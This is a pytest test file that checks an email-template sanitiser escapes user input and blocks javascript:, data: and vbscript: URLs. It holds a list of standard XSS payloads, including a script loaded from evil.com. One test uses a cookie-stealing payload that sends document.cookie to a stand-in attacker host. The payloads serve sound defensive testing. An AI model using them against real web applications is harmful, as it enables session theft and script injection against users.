"""
XSS Prevention Tests for Email Templates.

These tests verify that all user-provided content is properly HTML-escaped
before inclusion in email templates to prevent Cross-Site Scripting attacks.

OWASP Reference: https://owasp.org/www-community/attacks/xss/
"""

import pytest

from src.utils.security import (
    safe_email_content,
    safe_html_escape,
    safe_url,
    sanitize_email_template_data,
)


class TestXSSPreventionInEmailContent:
    """Test XSS prevention in email template content."""

    # Common XSS attack payloads
    XSS_PAYLOADS = [
        # Script tags
        "<script>alert('xss')</script>",
        "<SCRIPT>alert('xss')</SCRIPT>",
        "<script src='https://evil.com/xss.js'></script>",
        # Event handlers
        "<img src=x onerror=alert('xss')>",
        "<body onload=alert('xss')>",
        "<svg onload=alert('xss')>",
        # JavaScript URLs
        "javascript:alert('xss')",
        "JAVASCRIPT:alert('xss')",
        # Data URLs with scripts
        "data:text/html,<script>alert('xss')</script>",
        # HTML injection
        "<h1>Fake Header</h1>",
        "<a href='https://phishing.com'>Click Here</a>",
        # Encoded variants
        "&#60;script&#62;alert('xss')&#60;/script&#62;",
        # Nested tags
        "<<script>script>alert('xss')<</script>/script>",
        # Null bytes
        "<scr\x00ipt>alert('xss')</script>",
    ]

    def test_script_tag_escaped_in_name(self):
        """Script tags in guest name are escaped."""
        template = "<h1>Hello {name}!</h1>"
        context = {"name": "<script>alert('xss')</script>"}

        result = safe_email_content(template, context)

        assert "<script>" not in result
        assert "&lt;script&gt;" in result
        assert "alert(&#x27;xss&#x27;)" in result

    def test_event_handler_escaped_in_name(self):
        """Event handlers in content are escaped."""
        template = "<p>Welcome {name}</p>"
        context = {"name": "<img src=x onerror=alert('xss')>"}

        result = safe_email_content(template, context)

        assert "onerror=" not in result
        assert "&lt;img" in result

    def test_html_injection_escaped(self):
        """HTML injection attempts are escaped."""
        template = "<p>{message}</p>"
        context = {"message": "<h1>Fake Header</h1><a href='phishing.com'>Click</a>"}

        result = safe_email_content(template, context)

        assert "<h1>" not in result
        assert "<a href=" not in result
        assert "&lt;h1&gt;" in result

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_all_xss_payloads_escaped(self, payload):
        """All known XSS payloads are properly escaped."""
        template = "<div>{content}</div>"
        context = {"content": payload}

        result = safe_email_content(template, context)

        # No raw script tags should remain
        assert "<script" not in result.lower()
        # No raw event handlers should remain
        assert "onerror=" not in result.lower()
        assert "onload=" not in result.lower()
        # No raw HTML tags should remain (except the template's own div)
        assert result.count("<") == 2  # Opening and closing div only

    def test_multiple_fields_all_escaped(self):
        """Multiple fields in template are all escaped."""
        template = """
        <h1>Hello {name}!</h1>
        <p>Your message: {message}</p>
        <p>From: {sender}</p>
        """
        context = {
            "name": "<script>alert('name')</script>",
            "message": "<img onerror=alert('msg')>",
            "sender": "<a href='evil.com'>Evil</a>",
        }

        result = safe_email_content(template, context)

        assert "<script>" not in result
        assert "onerror=" not in result
        assert "<a href=" not in result


class TestXSSPreventionInURLs:
    """Test XSS prevention in URL values."""

    def test_javascript_url_blocked(self):
        """JavaScript URLs are blocked."""
        result = safe_url("javascript:alert('xss')")
        assert result == ""

    def test_javascript_url_case_insensitive(self):
        """JavaScript URL detection is case-insensitive."""
        payloads = [
            "JAVASCRIPT:alert('xss')",
            "JavaScript:alert('xss')",
            "JaVaScRiPt:alert('xss')",
        ]
        for payload in payloads:
            assert safe_url(payload) == ""

    def test_data_url_blocked(self):
        """Data URLs are blocked by default."""
        result = safe_url("data:text/html,<script>alert('xss')</script>")
        assert result == ""

    def test_vbscript_url_blocked(self):
        """VBScript URLs are blocked."""
        result = safe_url("vbscript:msgbox('xss')")
        assert result == ""

    def test_valid_https_url_allowed(self):
        """Valid HTTPS URLs are allowed."""
        url = "https://example.com/invitation?id=123"
        result = safe_url(url)
        assert "https://example.com" in result

    def test_valid_http_url_allowed(self):
        """Valid HTTP URLs are allowed."""
        url = "http://example.com/path"
        result = safe_url(url)
        assert "http://example.com" in result

    def test_mailto_url_allowed(self):
        """Mailto URLs are allowed."""
        result = safe_url("mailto:test@example.com")
        assert "mailto:" in result

    def test_url_special_chars_escaped(self):
        """Special characters in URLs are HTML-escaped."""
        url = "https://example.com/path?name=<script>"
        result = safe_url(url)
        assert "<script>" not in result
        assert "&lt;script&gt;" in result

    def test_url_in_template_context(self):
        """URLs in template context are sanitized."""
        template = '<a href="{invitation_url}">Click</a>'
        context = {"invitation_url": "javascript:alert('xss')"}

        result = safe_email_content(template, context)

        assert "javascript:" not in result

    def test_url_key_variations_sanitized(self):
        """All URL-like keys are sanitized."""
        context = {
            "url": "javascript:alert(1)",
            "link": "javascript:alert(2)",
            "invitation_url": "javascript:alert(3)",
            "callback_url": "javascript:alert(4)",
            "custom_url": "javascript:alert(5)",  # Ends with _url
        }

        result = sanitize_email_template_data(context)

        for key, value in result.items():
            assert "javascript:" not in value


class TestXSSInSendGridTemplateData:
    """Test XSS prevention in SendGrid template data."""

    def test_template_data_all_escaped(self):
        """All template data values are escaped."""
        data = {
            "name": "<script>alert('xss')</script>",
            "greeting": "<b>Bold</b>",
            "invitation_url": "https://example.com/invite",
        }

        result = sanitize_email_template_data(data)

        assert "&lt;script&gt;" in result["name"]
        assert "&lt;b&gt;" in result["greeting"]
        # Valid URLs should remain functional
        assert "https://example.com/invite" in result["invitation_url"]

    def test_none_values_become_empty_string(self):
        """None values are converted to empty strings."""
        data = {"name": None, "message": None}

        result = sanitize_email_template_data(data)

        assert result["name"] == ""
        assert result["message"] == ""

    def test_numeric_values_converted(self):
        """Numeric values are converted to strings."""
        data = {"count": 5, "amount": 99.99}

        result = sanitize_email_template_data(data)

        assert result["count"] == "5"
        assert result["amount"] == "99.99"


class TestEdgeCases:
    """Test edge cases and boundary conditions."""

    def test_empty_string_safe(self):
        """Empty strings are handled safely."""
        assert safe_html_escape("") == ""
        assert safe_url("") == ""

    def test_none_safe(self):
        """None values are handled safely."""
        assert safe_html_escape(None) == ""
        assert safe_url(None) == ""

    def test_unicode_preserved(self):
        """Unicode characters are preserved."""
        name = "Jose Garcia"
        result = safe_html_escape(name)
        assert "Jose" in result or "Jos" in result  # Accent may vary

    def test_legitimate_ampersand_escaped(self):
        """Ampersands in text are properly escaped."""
        text = "Tom & Jerry"
        result = safe_html_escape(text)
        assert "&amp;" in result

    def test_quotes_escaped(self):
        """Quotes are escaped to prevent attribute injection."""
        text = 'He said "hello"'
        result = safe_html_escape(text)
        assert "&quot;" in result

    def test_single_quotes_escaped(self):
        """Single quotes are escaped."""
        text = "It's working"
        result = safe_html_escape(text)
        assert "&#x27;" in result

    def test_very_long_content_handled(self):
        """Very long content is handled without errors."""
        long_content = "A" * 10000 + "<script>xss</script>"
        result = safe_html_escape(long_content)
        assert "<script>" not in result
        assert len(result) > 10000


class TestIntegrationWithEmailTemplates:
    """Integration tests with realistic email templates."""

    def test_invitation_email_template(self):
        """Full invitation email template is safe."""
        template = """
        <html>
        <body>
            <h1>Hello {recipient_name}!</h1>
            <p>You've been invited to a special event.</p>
            <p><a href="{invitation_url}">View Invitation</a></p>
            <p>Message from host: {message}</p>
        </body>
        </html>
        """
        context = {
            "recipient_name": "<script>document.cookie</script>",
            "invitation_url": "https://example.com/invite/123",
            "message": "<img src=x onerror=fetch('evil.com?c='+document.cookie)>",
        }

        result = safe_email_content(template, context)

        # No XSS vectors should remain
        assert "<script>" not in result
        assert "onerror=" not in result
        assert "document.cookie" not in result or "&#" in result

        # Valid URL should be present
        assert "https://example.com/invite/123" in result

    def test_reminder_email_template(self):
        """Reminder email template is safe."""
        template = """
        <h1>Hello {recipient_name}!</h1>
        <p>This is a friendly reminder about your RSVP.</p>
        <p>The event is in {days} days.</p>
        <p><a href="{invitation_url}">View Invitation & RSVP</a></p>
        """
        context = {
            "recipient_name": "John</h1><script>xss</script><h1>",
            "days": "7",
            "invitation_url": "javascript:alert(document.domain)",
        }

        result = safe_email_content(template, context)

        # XSS attempts should be escaped
        assert "<script>" not in result
        assert "javascript:" not in result
